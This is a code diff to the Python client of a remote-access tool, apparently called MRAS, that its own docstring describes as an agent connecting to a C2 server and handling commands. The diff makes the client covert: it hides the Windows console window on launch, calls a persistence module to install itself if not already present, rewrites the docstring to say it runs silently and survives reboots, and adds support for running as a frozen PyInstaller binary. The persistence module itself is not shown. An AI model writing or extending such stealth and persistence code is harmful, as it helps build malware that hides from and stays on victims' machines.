@@ -1,7 +1,6 @@
 """
 MRAS Client — remote agent.
-Connects to the C2 server, authenticates, and handles commands.
-Supports cross-platform operation and automatic failover.
+Runs silently in the background, survives reboots, reconnects automatically.
 """
 from __future__ import annotations
 import asyncio
@@ -13,8 +12,15 @@ from pathlib import Path
 
 import yaml
 
-sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
+# ── Path bootstrap (works both as .py and frozen PyInstaller binary) ────────
+if getattr(sys, "frozen", False):
+    _ROOT = Path(sys.executable).parent
+else:
+    _ROOT = Path(__file__).resolve().parents[1]
 
+sys.path.insert(0, str(_ROOT))
+
+from client.persistence import hide_console, install, is_installed
 from client.connection import ClientConnection
 
 
@@ -28,16 +34,16 @@ def load_config() -> dict:
 
 def setup_logging(cfg: dict) -> None:
     lc = cfg["logging"]
-    log_dir = Path("logs")
+    log_dir = _ROOT / "logs"
     log_dir.mkdir(exist_ok=True)
+    log_file = log_dir / Path(lc["file"]).name
     level = getattr(logging, lc["level"].upper(), logging.INFO)
     fmt = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
     fh = logging.handlers.RotatingFileHandler(
-        lc["file"], maxBytes=5 * 1024 * 1024, backupCount=3, encoding="utf-8"
+        str(log_file), maxBytes=5 * 1024 * 1024, backupCount=3, encoding="utf-8"
     )
     fh.setFormatter(logging.Formatter(fmt))
     handlers: list[logging.Handler] = [fh]
-    # Only attach console handler when not running as a windows noconsole binary
     if sys.stdout and sys.stdout.isatty():
         handlers.append(logging.StreamHandler())
     logging.basicConfig(level=level, format=fmt, handlers=handlers)
@@ -65,10 +71,20 @@ async def config_update_loop(cfg: dict) -> None:
 
 
 async def main() -> None:
+    # Hide console window immediately on Windows
+    hide_console()
+
     cfg = load_config()
     setup_logging(cfg)
     log = logging.getLogger("mras.client")
     log.info("MRAS Client starting")
+
+    # Install persistence if not already present
+    if not is_installed():
+        if install():
+            log.info("Persistence installed successfully")
+        else:
+            log.warning("Persistence installation failed")
 
     conn = ClientConnection(cfg)
     await asyncio.gather(
